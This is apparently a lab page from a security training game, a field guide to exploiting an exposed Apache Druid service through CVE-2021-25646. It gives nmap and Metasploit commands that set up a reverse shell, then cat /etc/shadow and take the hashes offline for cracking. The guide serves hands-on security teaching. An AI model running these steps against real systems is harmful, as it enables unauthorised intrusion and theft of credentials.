---
title: SAFETYNET Field Guide - Apache Druid RCE
layout: lab
description: Optional in-game guide for exploiting an exposed Apache Druid analytics service to gain a foothold on a backend
game_fragment: true
permalink: /labs/safetynet/apache-druid-rce/
redirect_from:
  - /labs/m06_follow_the_money/safetynet-field-guide-apache-druid-rce/
---

# SAFETYNET Field Guide: Apache Druid RCE

## Objective

Use this guide when your scan of a backend turns up an **Apache Druid** service. Druid is a real-time analytics database used to ingest and query large volumes of event data. Older releases (CVE-2021-25646, versions before `0.20.1`) let an unauthenticated request both switch on Druid's embedded JavaScript execution feature and run supplied code in the same request. That runs commands as the Druid service account. This is the way *onto* the box — from there you can read a world-readable shadow file and take the hashes offline.

## Quick Reference

- Default Druid router/broker port: **TCP 8888** (coordinator/overlord often **8081**). Confirm what your scan actually reports — the service can be placed on any port.
- The flaw is a feature left open: Druid will evaluate JavaScript if a request asks it to, and authentication is off by default.
- Metasploit module: `exploit/linux/http/apache_druid_js_rce`.
- You get command execution as the **service account** — unprivileged. That is enough to read a world-readable shadow file and start cracking.

```bash
# Confirm the service and version from your scan
nmap -sV -p- [target-ip]

# Exploit with Metasploit
msfconsole
use exploit/linux/http/apache_druid_js_rce
set RHOSTS [target-ip]
set RPORT [druid-port]
set LHOST [attacker-ip]
set LPORT [callback-port]
show options
exploit
```

Where:
- `[target-ip]` = the backend host running Druid
- `[druid-port]` = the port your scan found Druid on
- `[attacker-ip]` / `[callback-port]` = your listener for the reverse shell

## Core Workflow

1. Scan the host and identify the Druid service and its port. A full-port scan helps, since analytics services are often moved off their defaults.
2. Fingerprint the version so you know you are looking at the vulnerable, unauthenticated build.
3. Configure the exploit module: target host/port, then a payload with matching `LHOST`/`LPORT`.
4. Make sure your listener is reachable, then run the exploit.
5. Confirm command execution, then pivot to what you came for.

First commands after access:

```bash
id
hostname
# A readable shadow file is the next objective
ls -l /etc/shadow
cat /etc/shadow
```

If the shadow file is world-readable, copy it (and `/etc/passwd`) back to your box, combine them, and move to offline cracking — see the Offline Password Cracking guide. The accounts you want are the service accounts, not root.

## Common Failure Modes

- **No session / no execution:** Recheck the port is really Druid and that the version is the vulnerable one. Confirm the JavaScript-execution request reached the right endpoint and that your callback route back is open.
- **Shell drops immediately:** Prefer a simple command payload over a heavy session type on an analytics daemon under load.
- **Command runs but you cannot read what you need:** You have the service account's low-privilege context. Read what that account can; the hashes you want are in a world-readable file, not a root-only path.
- **Firewalled callback:** Try a bind payload or a different callback port if the reverse connection never lands.

## Mission Application

Where a backend puts an analytics service like Druid in front of you, it is the high-value foothold rather than the prize. The RCE gets you a shell as an ordinary service account — the start of the chain, not the end. Read what that account can reach first: a world-readable shadow file hands you the account hashes, which you crack offline, and reused or weak passwords open the accounts that actually hold the records. Take the foothold deliberately, read before you run, and remember the foothold itself carries no flag — the flags are the cracking, reuse and privilege-escalation rewards further in. Submit each at the mission's terminal as you earn it.

---

*Adapted from the SAFETYNET distcc exploitation field guide and the SecGen `apache_druid_rce` module (CVE-2021-25646). Source author attribution preserved.*
